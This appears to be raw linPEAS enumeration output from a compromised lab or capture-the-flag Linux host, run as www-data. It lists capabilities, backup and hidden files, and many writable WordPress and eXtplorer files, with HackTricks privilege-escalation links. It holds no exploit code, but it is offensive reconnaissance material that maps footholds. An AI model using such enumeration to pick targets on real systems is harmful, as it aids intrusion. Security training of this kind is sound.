/snap/core20/1852/usr/bin/ping = cap_net_raw+ep
/snap/core20/1611/usr/bin/ping = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                     
                                                                                                                    
╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3500 Jan 31 22:09 sbin.dhclient                                                             
-rw-r--r-- 1 root root  3202 Feb 25  2020 usr.bin.man
-rw-r--r-- 1 root root 28486 Nov 28 04:55 usr.lib.snapd.snap-confine.real
-rw-r--r-- 1 root root  1575 Feb 11  2020 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1482 Feb 10 11:34 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                             
files with acls in searched folders Not Found                                                                       
                                                                                                                    
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                          
/usr/bin/rescan-scsi-bus.sh                                                                                         
/usr/bin/gettext.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2023-01-24+07:30:37.6322617920 /etc/console-setup/cached_setup_terminal.sh                                          
2023-01-24+07:30:37.6322617920 /etc/console-setup/cached_setup_keyboard.sh
2023-01-24+07:30:37.6322617920 /etc/console-setup/cached_setup_font.sh

╔══════════╣ Unexpected in root
/swap.img                                                                                                           

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                   
total 44                                                                                                            
drwxr-xr-x   2 root root 4096 Apr  6 03:29 .
drwxr-xr-x 100 root root 4096 Apr  6 03:30 ..
-rw-r--r--   1 root root   96 Dec  5  2019 01-locale-fix.sh
-rw-r--r--   1 root root 1557 Feb 17  2020 Z97-byobu.sh
-rwxr-xr-x   1 root root 3417 Jun 15  2022 Z99-cloud-locale-test.sh
-rwxr-xr-x   1 root root  873 Jun 15  2022 Z99-cloudinit-warnings.sh
-rw-r--r--   1 root root  835 May 11  2022 apps-bin-path.sh
-rw-r--r--   1 root root  729 Feb  2  2020 bash_completion.sh
-rw-r--r--   1 root root 1003 Aug 13  2019 cedilla-portuguese.sh
-rw-r--r--   1 root root 1107 Nov  3  2019 gawk.csh
-rw-r--r--   1 root root  757 Nov  3  2019 gawk.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                     
                                                                                                                    
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                        
═╣ Credentials in fstab/mtab? ........... No                                                                        
═╣ Can I read shadow files? ............. No                                                                        
═╣ Can I read shadow plists? ............ No                                                                        
═╣ Can I write shadow plists? ........... No                                                                        
═╣ Can I read opasswd file? ............. No                                                                        
═╣ Can I write in network-scripts? ...... No                                                                        
═╣ Can I read root folder? .............. No                                                                        
                                                                                                                    
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                              
/root/
/var/www

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
                                                                                                                    
╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                    
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/kern.log                                                                                                   
/var/log/journal/d2737565435f491e97f49bb5b34ba02e/system.journal
/var/log/syslog
/var/log/auth.log

╔══════════╣ Writable log files (logrotten) (limit 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation                           
logrotate 3.14.0                                                                                                    

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes

╔══════════╣ Files inside /home/www-data (limit 20)
                                                                                                                    
╔══════════╣ Files inside others home (limit 20)
/home/dora/.bashrc                                                                                                  
/home/dora/.bash_logout
/home/dora/local.txt
/home/dora/.profile
/var/www/html/wp-trackback.php
/var/www/html/wp-login.php
/var/www/html/wp-content/themes/twentytwentytwo/assets/fonts/dm-sans/DMSans-Regular.ttf
/var/www/html/wp-content/themes/twentytwentytwo/assets/fonts/dm-sans/DMSans-Bold.ttf
/var/www/html/wp-content/themes/twentytwentytwo/assets/fonts/dm-sans/LICENSE.txt
/var/www/html/wp-content/themes/twentytwentytwo/assets/fonts/dm-sans/DMSans-BoldItalic.ttf
/var/www/html/wp-content/themes/twentytwentytwo/assets/fonts/dm-sans/DMSans-Italic.ttf
/var/www/html/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Italic.otf.woff2
/var/www/html/wp-content/themes/twentytwentytwo/assets/fonts/source-serif-pro/SourceSerif4Variable-Italic.otf.woff2
/var/www/html/wp-content/themes/twentytwentytwo/assets/fonts/source-serif-pro/SourceSerif4Variable-Roman.ttf.woff2
/var/www/html/wp-content/themes/twentytwentytwo/assets/fonts/source-serif-pro/LICENSE.md
/var/www/html/wp-content/themes/twentytwentytwo/assets/fonts/source-serif-pro/SourceSerif4Variable-Roman.otf.woff2
/var/www/html/wp-content/themes/twentytwentytwo/assets/fonts/source-serif-pro/SourceSerif4Variable-Italic.ttf.woff2
/var/www/html/wp-content/themes/twentytwentytwo/assets/fonts/inter/Inter.ttf
/var/www/html/wp-content/themes/twentytwentytwo/assets/fonts/inter/LICENSE.txt
/var/www/html/wp-content/themes/twentytwentytwo/assets/fonts/ibm-plex/IBMPlexMono-Bold.woff2
grep: write error: Broken pipe

╔══════════╣ Searching installed mail applications
                                                                                                                    
╔══════════╣ Mails (limit 50)
                                                                                                                    
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 2743 Aug 31  2022 /etc/apt/sources.list.curtin.old                                           
-rw-r--r-- 1 root root 2756 Feb 13  2020 /usr/share/man/man8/vgcfgbackup.8.gz
-rwxr-xr-x 1 root root 226 Feb 17  2020 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz
-rw-r--r-- 1 root root 392817 Feb  9  2020 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 11886 Apr  6 03:29 /usr/share/info/dir.old
-rw-r--r-- 1 root root 9073 Jan  5 16:08 /usr/lib/modules/5.4.0-137-generic/kernel/drivers/net/team/team_mode_activebackup.ko                                                                                                           
-rw-r--r-- 1 root root 9833 Jan  5 16:08 /usr/lib/modules/5.4.0-137-generic/kernel/drivers/power/supply/wm831x_backup.ko                                                                                                                
-rw-r--r-- 1 root root 9073 Mar 17 18:08 /usr/lib/modules/5.4.0-146-generic/kernel/drivers/net/team/team_mode_activebackup.ko                                                                                                           
-rw-r--r-- 1 root root 9833 Mar 17 18:08 /usr/lib/modules/5.4.0-146-generic/kernel/drivers/power/supply/wm831x_backup.ko                                                                                                                
-rw-r--r-- 1 root root 44048 Sep 19  2022 /usr/lib/x86_64-linux-gnu/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 1413 Jan 24 07:34 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-38.pyc                                                                                               
-rw-r--r-- 1 root root 1802 Aug 15  2022 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py
-rwxr-xr-x 1 root root 1086 Nov 25  2019 /usr/src/linux-headers-5.4.0-137/tools/testing/selftests/net/tcp_fastopen_backup_key.sh                                                                                                        
-rw-r--r-- 1 root root 237863 Jan  5 16:08 /usr/src/linux-headers-5.4.0-137-generic/.config.old
-rw-r--r-- 1 root root 0 Jan  5 16:08 /usr/src/linux-headers-5.4.0-137-generic/include/config/net/team/mode/activebackup.h                                                                                                              
-rw-r--r-- 1 root root 0 Jan  5 16:08 /usr/src/linux-headers-5.4.0-137-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 237898 Mar 17 18:08 /usr/src/linux-headers-5.4.0-146-generic/.config.old
-rw-r--r-- 1 root root 0 Mar 17 18:08 /usr/src/linux-headers-5.4.0-146-generic/include/config/net/team/mode/activebackup.h                                                                                                              
-rw-r--r-- 1 root root 0 Mar 17 18:08 /usr/src/linux-headers-5.4.0-146-generic/include/config/wm831x/backup.h
-rwxr-xr-x 1 root root 1086 Nov 25  2019 /usr/src/linux-headers-5.4.0-146/tools/testing/selftests/net/tcp_fastopen_backup_key.sh                                                                                                        

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3031001           
Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3031001
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3031001
Found /var/www/html/filemanager/scripts/editarea/plugins/charmap/images/Thumbs.db: Composite Document File V2 Document, Cannot read section info
Found /var/www/html/filemanager/scripts/extjs3/resources/images/default/grid/Thumbs.db: Composite Document File V2 Document, Cannot read section info

 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)                                        
 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)                                                     
                                                                                                                    
╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                          
total 12K
drwxr-xr-x  3 root     root     4.0K Apr  6 03:30 .
drwxr-xr-x 14 root     root     4.0K Apr  6 03:30 ..
drwxr-xr-x  7 www-data www-data 4.0K Apr 11 03:35 html

/var/www/html:
total 252K
drwxr-xr-x  7 www-data www-data 4.0K Apr 11 03:35 .
drwxr-xr-x  3 root     root     4.0K Apr  6 03:30 ..

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw------- 1 root root 0 Mar  8 04:34 /snap/core20/1852/etc/.pwd.lock                                               
-rw-r--r-- 1 root root 220 Feb 25  2020 /snap/core20/1852/etc/skel/.bash_logout
-rw------- 1 root root 0 Aug  5  2022 /snap/core20/1611/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Feb 25  2020 /snap/core20/1611/etc/skel/.bash_logout
-rw-r--r-- 1 dora dora 220 Feb 25  2020 /home/dora/.bash_logout
-rw-r--r-- 1 root root 220 Feb 25  2020 /etc/skel/.bash_logout
-rw------- 1 root root 0 Aug 31  2022 /etc/.pwd.lock
-rw------- 1 root root 0 Apr  6 13:30 /run/snapd/lock/.lock
-rw-r--r-- 1 root root 20 Apr  6 13:30 /run/cloud-init/.instance-id
-rw-r--r-- 1 root root 2 Apr 11 02:29 /run/cloud-init/.ds-identify.result
-rw-r--r-- 1 landscape landscape 0 Aug 31  2022 /var/lib/landscape/.cleanup.user
-rw-r--r-- 1 www-data www-data 89 Nov 12  2020 /var/www/html/wp-content/themes/twentytwentyone/.stylelintignore
-rw-r--r-- 1 www-data www-data 689 May 24  2021 /var/www/html/wp-content/themes/twentytwentyone/.stylelintrc-css.json
-rw-r--r-- 1 www-data www-data 425 May 24  2021 /var/www/html/wp-content/themes/twentytwentyone/.stylelintrc.json
-rw-r--r-- 1 www-data www-data 654 Jul 26  2022 /var/www/html/wp-content/plugins/akismet/.htaccess
-rw-r--r-- 1 www-data www-data 261 Apr 11 03:36 /var/www/html/.htaccess
-rw-r--r-- 1 www-data www-data 413 Apr  6 03:33 /var/www/html/filemanager/config/.htusers.php
-rw-r--r-- 1 www-data www-data 15 Feb 23  2016 /var/www/html/filemanager/config/.htaccess
-rw-r--r-- 1 www-data www-data 15 Feb 23  2016 /var/www/html/filemanager/include/.htaccess

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                                                                                   
-rwxr-xr-x 1 www-data www-data 828260 Mar 28 02:35 /tmp/linpeas.sh                                                  
-rw-r--r-- 1 root root 3935 Apr  6 03:28 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 36989 Apr  6 03:30 /var/backups/apt.extended_states.0

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                   
uniq: write error: Broken pipe                                                                                      
/dev/mqueue
/dev/shm
/run/lock
/run/lock/apache2
/run/screen
/snap/core20/1611/run/lock
/snap/core20/1611/tmp
/snap/core20/1611/var/tmp
/snap/core20/1852/run/lock
/snap/core20/1852/tmp
/snap/core20/1852/var/tmp
/tmp
/tmp/linpeas.sh
/tmp/tmux-33
/var/cache/apache2/mod_cache_disk
/var/crash
/var/lib/php/sessions
/var/tmp
/var/www/html
/var/www/html/.htaccess
/var/www/html/filemanager
/var/www/html/filemanager/CHANGELOG.txt
/var/www/html/filemanager/LICENSE_GPL.txt
/var/www/html/filemanager/LICENSE_MPL.txt
/var/www/html/filemanager/README.txt
/var/www/html/filemanager/admin.extplorer.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/filemanager/config/.htaccess
/var/www/html/filemanager/config/.htusers.php
/var/www/html/filemanager/config/bookmarks_extplorer_admin.php
/var/www/html/filemanager/config/conf.php
/var/www/html/filemanager/config/index.html
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/filemanager/configuration.ext.php
/var/www/html/filemanager/copyright
/var/www/html/filemanager/eXtplorer.ico
/var/www/html/filemanager/extplorer.init.php
/var/www/html/filemanager/extplorer.j15.xml
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/filemanager/ftp_tmp/index.html
/var/www/html/filemanager/images
/var/www/html/filemanager/images/extension
/var/www/html/filemanager/images/extension/index.html
/var/www/html/filemanager/images/index.html
/var/www/html/filemanager/include
/var/www/html/filemanager/include/.htaccess
/var/www/html/filemanager/include/admin.php
/var/www/html/filemanager/include/archive.php
/var/www/html/filemanager/include/authentication
/var/www/html/filemanager/include/authentication/extplorer.php
/var/www/html/filemanager/include/authentication/ftp.php
/var/www/html/filemanager/include/authentication/ssh2.php
/var/www/html/filemanager/include/bookmarks.php
/var/www/html/filemanager/include/chmod.php
/var/www/html/filemanager/include/copy_move.php
/var/www/html/filemanager/include/delete.php
/var/www/html/filemanager/include/diff.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/filemanager/index.php
/var/www/html/filemanager/install.extplorer.php
/var/www/html/filemanager/languages
/var/www/html/filemanager/languages/arabic.php
/var/www/html/filemanager/languages/arabic_mimes.php
/var/www/html/filemanager/languages/brazilian_portuguese.php
/var/www/html/filemanager/languages/brazilian_portuguese_mimes.php
/var/www/html/filemanager/languages/bulgarian.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/filemanager/libraries
/var/www/html/filemanager/libraries/Archive
/var/www/html/filemanager/libraries/Archive/adapter
/var/www/html/filemanager/libraries/Archive/adapter/index.html
/var/www/html/filemanager/libraries/Archive/adapter/rar.php
/var/www/html/filemanager/libraries/Archive/adapter/zip.php
/var/www/html/filemanager/libraries/Archive/archive.php
/var/www/html/filemanager/libraries/Archive/file.php
/var/www/html/filemanager/libraries/Archive/folder.php
/var/www/html/filemanager/libraries/Archive/index.html
/var/www/html/filemanager/libraries/Archive/path.php
/var/www/html/filemanager/libraries/Auth
/var/www/html/filemanager/libraries/Auth/Auth.php
/var/www/html/filemanager/libraries/Auth/HTTP
/var/www/html/filemanager/libraries/Auth/HTTP/HTTP.php
/var/www/html/filemanager/libraries/Console
/var/www/html/filemanager/libraries/Console/Getopt.php
/var/www/html/filemanager/libraries/FTP
/var/www/html/filemanager/libraries/FTP.php
/var/www/html/filemanager/libraries/FTP/Observer.php
/var/www/html/filemanager/libraries/FTP/Socket.php
/var/www/html/filemanager/libraries/FTP/index.html
/var/www/html/filemanager/libraries/File_Operations.php
/var/www/html/filemanager/libraries/HTTP
/var/www/html/filemanager/libraries/HTTP/WebDAV
/var/www/html/filemanager/libraries/HTTP/WebDAV/Server
/var/www/html/filemanager/libraries/HTTP/WebDAV/Server.php
/var/www/html/filemanager/libraries/HTTP/WebDAV/Server/Filesystem.php
/var/www/html/filemanager/libraries/HTTP/WebDAV/Tools
/var/www/html/filemanager/libraries/HTTP/WebDAV/Tools/_parse_lockinfo.php
/var/www/html/filemanager/libraries/HTTP/WebDAV/Tools/_parse_propfind.php
/var/www/html/filemanager/libraries/HTTP/WebDAV/Tools/_parse_proppatch.php
/var/www/html/filemanager/libraries/JSON.php
/var/www/html/filemanager/libraries/MIME
/var/www/html/filemanager/libraries/MIME/Parameter.php
/var/www/html/filemanager/libraries/MIME/Type.php
/var/www/html/filemanager/libraries/MIME/index.html
/var/www/html/filemanager/libraries/PEAR.php
/var/www/html/filemanager/libraries/PasswordHash.php
/var/www/html/filemanager/libraries/SSH2.php
/var/www/html/filemanager/libraries/System.php
/var/www/html/filemanager/libraries/Tar.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/filemanager/libraries/Text/Diff
/var/www/html/filemanager/libraries/Text/Diff.php
/var/www/html/filemanager/libraries/Text/Diff/Engine
/var/www/html/filemanager/libraries/Text/Diff/Engine/native.php
/var/www/html/filemanager/libraries/Text/Diff/Engine/shell.php
/var/www/html/filemanager/libraries/Text/Diff/Engine/string.php
/var/www/html/filemanager/libraries/Text/Diff/Engine/xdiff.php
/var/www/html/filemanager/libraries/Text/Diff/Mapped.php
/var/www/html/filemanager/libraries/Text/Diff/Renderer
/var/www/html/filemanager/libraries/Text/Diff/Renderer.php
/var/www/html/filemanager/libraries/Text/Diff/Renderer/context.php
/var/www/html/filemanager/libraries/Text/Diff/Renderer/inline.php
/var/www/html/filemanager/libraries/Text/Diff/Renderer/unified.php
/var/www/html/filemanager/libraries/Text/Diff/ThreeWay.php
/var/www/html/filemanager/libraries/Text/TextEncoding.php
/var/www/html/filemanager/libraries/compat.php41x.php
/var/www/html/filemanager/libraries/compat.php42x.php
/var/www/html/filemanager/libraries/compat.php50x.php
/var/www/html/filemanager/libraries/geshi
/var/www/html/filemanager/libraries/geshi/geshi
/var/www/html/filemanager/libraries/geshi/geshi.php
/var/www/html/filemanager/libraries/geshi/geshi/abap.php
/var/www/html/filemanager/libraries/geshi/geshi/actionscript.php
/var/www/html/filemanager/libraries/geshi/geshi/actionscript3.php
/var/www/html/filemanager/libraries/geshi/geshi/ada.php
/var/www/html/filemanager/libraries/geshi/geshi/apache.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/filemanager/libraries/geshi/index.html
/var/www/html/filemanager/libraries/index.html
/var/www/html/filemanager/libraries/inputfilter.php
/var/www/html/filemanager/libraries/lib_zip.php
/var/www/html/filemanager/libraries/standalone.php
/var/www/html/filemanager/script.php
/var/www/html/filemanager/scripts
/var/www/html/filemanager/scripts/application.js.php
/var/www/html/filemanager/scripts/archive.js.php
/var/www/html/filemanager/scripts/editarea
/var/www/html/filemanager/scripts/editarea/edit_area.css
/var/www/html/filemanager/scripts/editarea/edit_area.js
/var/www/html/filemanager/scripts/editarea/edit_area_full_with_plugins.js
/var/www/html/filemanager/scripts/editarea/images
/var/www/html/filemanager/scripts/editarea/images/index.html
/var/www/html/filemanager/scripts/editarea/index.html
/var/www/html/filemanager/scripts/editarea/langs
/var/www/html/filemanager/scripts/editarea/langs/bg.js
/var/www/html/filemanager/scripts/editarea/langs/cs.js
/var/www/html/filemanager/scripts/editarea/langs/de.js
/var/www/html/filemanager/scripts/editarea/langs/dk.js
/var/www/html/filemanager/scripts/editarea/langs/en.js
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/filemanager/scripts/editarea/license.txt
/var/www/html/filemanager/scripts/editarea/license_lgpl.txt
/var/www/html/filemanager/scripts/editarea/plugins
/var/www/html/filemanager/scripts/editarea/plugins/charmap
/var/www/html/filemanager/scripts/editarea/plugins/charmap/charmap.js
/var/www/html/filemanager/scripts/editarea/plugins/charmap/css
/var/www/html/filemanager/scripts/editarea/plugins/charmap/css/charmap.css
/var/www/html/filemanager/scripts/editarea/plugins/charmap/css/index.html
/var/www/html/filemanager/scripts/editarea/plugins/charmap/images
/var/www/html/filemanager/scripts/editarea/plugins/charmap/images/Thumbs.db
/var/www/html/filemanager/scripts/editarea/plugins/charmap/images/index.html
/var/www/html/filemanager/scripts/editarea/plugins/charmap/index.html
/var/www/html/filemanager/scripts/editarea/plugins/charmap/jscripts
/var/www/html/filemanager/scripts/editarea/plugins/charmap/jscripts/index.html
/var/www/html/filemanager/scripts/editarea/plugins/charmap/jscripts/map.js
/var/www/html/filemanager/scripts/editarea/plugins/charmap/langs
/var/www/html/filemanager/scripts/editarea/plugins/charmap/langs/bg.js
/var/www/html/filemanager/scripts/editarea/plugins/charmap/langs/cs.js
/var/www/html/filemanager/scripts/editarea/plugins/charmap/langs/de.js
/var/www/html/filemanager/scripts/editarea/plugins/charmap/langs/dk.js
/var/www/html/filemanager/scripts/editarea/plugins/charmap/langs/en.js
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/filemanager/scripts/editarea/plugins/charmap/popup.html
/var/www/html/filemanager/scripts/editarea/plugins/index.html
/var/www/html/filemanager/scripts/editarea/reg_syntax
/var/www/html/filemanager/scripts/editarea/reg_syntax/basic.js
/var/www/html/filemanager/scripts/editarea/reg_syntax/brainfuck.js
/var/www/html/filemanager/scripts/editarea/reg_syntax/c.js
/var/www/html/filemanager/scripts/editarea/reg_syntax/coldfusion.js
/var/www/html/filemanager/scripts/editarea/reg_syntax/cpp.js
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/filemanager/scripts/editarea/template.html
/var/www/html/filemanager/scripts/extjs3
/var/www/html/filemanager/scripts/extjs3-ext
/var/www/html/filemanager/scripts/extjs3-ext/ux.editareaadapater
/var/www/html/filemanager/scripts/extjs3-ext/ux.editareaadapater/ext-editarea-adapter.js
/var/www/html/filemanager/scripts/extjs3-ext/ux.fileuploadfield
/var/www/html/filemanager/scripts/extjs3-ext/ux.fileuploadfield/ext-fileUploadField.js
/var/www/html/filemanager/scripts/extjs3-ext/ux.fileuploadfield/fileuploadfield.css
/var/www/html/filemanager/scripts/extjs3-ext/ux.locationbar
/var/www/html/filemanager/scripts/extjs3-ext/ux.locationbar/Ext.ux.LocationBar.js
/var/www/html/filemanager/scripts/extjs3-ext/ux.locationbar/LocationBar.css
/var/www/html/filemanager/scripts/extjs3-ext/ux.locationbar/Locationbar-component.html
/var/www/html/filemanager/scripts/extjs3-ext/ux.locationbar/Locationbar-render.html
/var/www/html/filemanager/scripts/extjs3-ext/ux.ondemandload
/var/www/html/filemanager/scripts/extjs3-ext/ux.ondemandload/scriptloader.js
/var/www/html/filemanager/scripts/extjs3-ext/ux.statusbar
/var/www/html/filemanager/scripts/extjs3-ext/ux.statusbar/ext-statusbar.js
/var/www/html/filemanager/scripts/extjs3-ext/ux.swfupload
/var/www/html/filemanager/scripts/extjs3-ext/ux.swfupload/SwfUpload.js
/var/www/html/filemanager/scripts/extjs3-ext/ux.swfupload/SwfUploadPanel.css
/var/www/html/filemanager/scripts/extjs3-ext/ux.swfupload/SwfUploadPanel.js
/var/www/html/filemanager/scripts/extjs3-ext/ux.swfupload/plugins
/var/www/html/filemanager/scripts/extjs3-ext/ux.swfupload/plugins/SWFObject License.txt
/var/www/html/filemanager/scripts/extjs3-ext/ux.swfupload/plugins/swfupload.cookies.js
/var/www/html/filemanager/scripts/extjs3-ext/ux.swfupload/plugins/swfupload.proxy.js
/var/www/html/filemanager/scripts/extjs3-ext/ux.swfupload/plugins/swfupload.queue.js
/var/www/html/filemanager/scripts/extjs3-ext/ux.swfupload/plugins/swfupload.speed.js
/var/www/html/filemanager/scripts/extjs3-ext/ux.swfupload/swfupload.swf
/var/www/html/filemanager/scripts/extjs3/adapter
/var/www/html/filemanager/scripts/extjs3/adapter/ext
/var/www/html/filemanager/scripts/extjs3/adapter/ext/ext-base.js
/var/www/html/filemanager/scripts/extjs3/adapter/ext/index.html
/var/www/html/filemanager/scripts/extjs3/charts.swf
/var/www/html/filemanager/scripts/extjs3/expressinstall.swf
/var/www/html/filemanager/scripts/extjs3/ext-all.js
/var/www/html/filemanager/scripts/extjs3/index.html
/var/www/html/filemanager/scripts/extjs3/resources
/var/www/html/filemanager/scripts/extjs3/resources/css
/var/www/html/filemanager/scripts/extjs3/resources/css/README.txt
/var/www/html/filemanager/scripts/extjs3/resources/css/ext-all-notheme.css
/var/www/html/filemanager/scripts/extjs3/resources/css/ext-all.css
/var/www/html/filemanager/scripts/extjs3/resources/css/index.html
/var/www/html/filemanager/scripts/extjs3/resources/css/reset-min.css
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/filemanager/scripts/extjs3/resources/css/structure/borders.css
/var/www/html/filemanager/scripts/extjs3/resources/css/structure/box.css
/var/www/html/filemanager/scripts/extjs3/resources/css/structure/button.css
/var/www/html/filemanager/scripts/extjs3/resources/css/structure/combo.css
/var/www/html/filemanager/scripts/extjs3/resources/css/structure/core.css
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/filemanager/scripts/extjs3/resources/css/visual
/var/www/html/filemanager/scripts/extjs3/resources/css/visual/borders.css
/var/www/html/filemanager/scripts/extjs3/resources/css/visual/box.css
/var/www/html/filemanager/scripts/extjs3/resources/css/visual/button.css
/var/www/html/filemanager/scripts/extjs3/resources/css/visual/combo.css
/var/www/html/filemanager/scripts/extjs3/resources/css/visual/core.css
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/filemanager/scripts/extjs3/resources/css/xtheme-blue.css
/var/www/html/filemanager/scripts/extjs3/resources/images
/var/www/html/filemanager/scripts/extjs3/resources/images/default
/var/www/html/filemanager/scripts/extjs3/resources/images/default/box
/var/www/html/filemanager/scripts/extjs3/resources/images/default/box/index.html
/var/www/html/filemanager/scripts/extjs3/resources/images/default/button
/var/www/html/filemanager/scripts/extjs3/resources/images/default/button/index.html
/var/www/html/filemanager/scripts/extjs3/resources/images/default/dd
/var/www/html/filemanager/scripts/extjs3/resources/images/default/dd/index.html
/var/www/html/filemanager/scripts/extjs3/resources/images/default/editor
/var/www/html/filemanager/scripts/extjs3/resources/images/default/editor/index.html
/var/www/html/filemanager/scripts/extjs3/resources/images/default/form
/var/www/html/filemanager/scripts/extjs3/resources/images/default/form/clear-trigger.psd
/var/www/html/filemanager/scripts/extjs3/resources/images/default/form/date-trigger.psd
/var/www/html/filemanager/scripts/extjs3/resources/images/default/form/index.html
/var/www/html/filemanager/scripts/extjs3/resources/images/default/form/search-trigger.psd
/var/www/html/filemanager/scripts/extjs3/resources/images/default/form/trigger.psd
/var/www/html/filemanager/scripts/extjs3/resources/images/default/grid
/var/www/html/filemanager/scripts/extjs3/resources/images/default/grid/Thumbs.db
/var/www/html/filemanager/scripts/extjs3/resources/images/default/grid/index.html
/var/www/html/filemanager/scripts/extjs3/resources/images/default/index.html
/var/www/html/filemanager/scripts/extjs3/resources/images/default/layout
/var/www/html/filemanager/scripts/extjs3/resources/images/default/layout/index.html
/var/www/html/filemanager/scripts/extjs3/resources/images/default/menu
/var/www/html/filemanager/scripts/extjs3/resources/images/default/menu/index.html
/var/www/html/filemanager/scripts/extjs3/resources/images/default/panel
/var/www/html/filemanager/scripts/extjs3/resources/images/default/panel/index.html
/var/www/html/filemanager/scripts/extjs3/resources/images/default/progress
/var/www/html/filemanager/scripts/extjs3/resources/images/default/progress/index.html
/var/www/html/filemanager/scripts/extjs3/resources/images/default/qtip
/var/www/html/filemanager/scripts/extjs3/resources/images/default/qtip/index.html
/var/www/html/filemanager/scripts/extjs3/resources/images/default/shared
/var/www/html/filemanager/scripts/extjs3/resources/images/default/shared/index.html
/var/www/html/filemanager/scripts/extjs3/resources/images/default/sizer
/var/www/html/filemanager/scripts/extjs3/resources/images/default/sizer/index.html
/var/www/html/filemanager/scripts/extjs3/resources/images/default/slider
/var/www/html/filemanager/scripts/extjs3/resources/images/default/slider/index.html
/var/www/html/filemanager/scripts/extjs3/resources/images/default/tabs
/var/www/html/filemanager/scripts/extjs3/resources/images/default/tabs/index.html
/var/www/html/filemanager/scripts/extjs3/resources/images/default/toolbar
/var/www/html/filemanager/scripts/extjs3/resources/images/default/toolbar/index.html
/var/www/html/filemanager/scripts/extjs3/resources/images/default/tree
/var/www/html/filemanager/scripts/extjs3/resources/images/default/tree/index.html
/var/www/html/filemanager/scripts/extjs3/resources/images/default/window
/var/www/html/filemanager/scripts/extjs3/resources/images/default/window/index.html
/var/www/html/filemanager/scripts/extjs3/resources/images/default/window/left-corners.psd
/var/www/html/filemanager/scripts/extjs3/resources/images/default/window/left-right.psd
/var/www/html/filemanager/scripts/extjs3/resources/images/default/window/right-corners.psd
/var/www/html/filemanager/scripts/extjs3/resources/images/default/window/top-bottom.psd
/var/www/html/filemanager/scripts/extjs3/resources/images/index.html
/var/www/html/filemanager/scripts/extjs3/resources/index.html
/var/www/html/filemanager/scripts/functions.js.php
/var/www/html/filemanager/scripts/index.html
/var/www/html/filemanager/scripts/yui
/var/www/html/filemanager/scripts/yui/utilities
/var/www/html/filemanager/scripts/yui/utilities/utilities.js
/var/www/html/filemanager/sql
/var/www/html/filemanager/sql/install.mysql.utf8.sql
/var/www/html/filemanager/sql/uninstall.mysql.utf8.sql
/var/www/html/filemanager/style
/var/www/html/filemanager/style/index.html
/var/www/html/filemanager/style/opacity.js
/var/www/html/filemanager/style/style.css
/var/www/html/filemanager/uploadhandler.php
/var/www/html/filemanager/webdav.php
/var/www/html/filemanager/webdav_authenticate.php
/var/www/html/filemanager/webdav_table.sql.php
/var/www/html/index.php
/var/www/html/license.txt
/var/www/html/readme.html
/var/www/html/wordpress
